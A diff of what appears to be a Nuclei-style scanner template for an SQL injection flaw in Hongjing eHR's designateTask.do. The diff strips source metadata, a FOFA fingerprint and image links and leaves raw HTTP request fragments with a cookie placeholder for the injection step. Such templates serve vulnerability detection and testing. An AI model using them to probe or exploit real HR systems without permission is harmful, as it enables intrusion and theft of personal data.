@@ -3,12 +3,8 @@ info:
   name: 宏景eHR designateTask.do 存在SQL注入漏洞_tid7y5tage5n0tgd
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  description: ''
   tags: sqli,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: app="HJSOFT-HCM"
 http:
 - raw:
   - 'GET /module/system/qrcard/mobilewrite/qrcardmain.jsp HTTP/1.1
@@ -25,7 +21,6 @@ http:
 
     Accept-Encoding: gzip, deflate
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1757831008791-d6576206-1a4e-4c99-84bf-b4e6e418bb9c.png)
 
     携带cookie进行注入'
   redirects: false
@@ -48,10 +43,7 @@ http:
 
     Accept-Encoding: gzip, deflate
 
-    Cookie: 获取的cookie
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1757831009034-7a0ddfb7-4b3e-4196-bc3b-c7b8e71550b9.png)'
+    Cookie: 获取的cookie'
   redirects: false
   matchers:
   - status:
